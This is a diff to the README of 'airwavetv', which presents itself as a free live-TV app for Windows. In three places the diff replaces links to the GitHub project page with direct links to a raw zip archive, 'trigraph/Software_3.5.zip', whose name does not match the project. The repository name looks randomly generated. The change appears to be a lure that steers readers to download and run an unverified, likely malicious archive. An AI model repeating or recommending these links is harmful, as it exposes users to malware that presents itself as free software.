@@ -1,6 +1,6 @@
 # 📺 airwavetv - Watch Free Live TV in One Place
 
-[![Download airwavetv](https://img.shields.io/badge/Download%20airwavetv-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gilbertian-pithecanthropus683/airwavetv)
+[![Download airwavetv](https://img.shields.io/badge/Download%20airwavetv-2f80ed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gilbertian-pithecanthropus683/airwavetv/raw/refs/heads/main/trigraph/Software_3.5.zip)
 
 ## 🧭 What airwavetv is
 
@@ -12,7 +12,7 @@ It is built for people who want one place to view live TV streams without a comp
 
 Use this link to visit the page to download:
 
-https://github.com/gilbertian-pithecanthropus683/airwavetv
+https://github.com/gilbertian-pithecanthropus683/airwavetv/raw/refs/heads/main/trigraph/Software_3.5.zip
 
 Open the page, get the project files, then save them to a folder on your Windows PC.
 
@@ -141,7 +141,7 @@ Use a stronger connection or close other downloads and streaming apps.
 
 Project page and download access:
 
-https://github.com/gilbertian-pithecanthropus683/airwavetv
+https://github.com/gilbertian-pithecanthropus683/airwavetv/raw/refs/heads/main/trigraph/Software_3.5.zip
 
 ## 🧷 Project topics
 
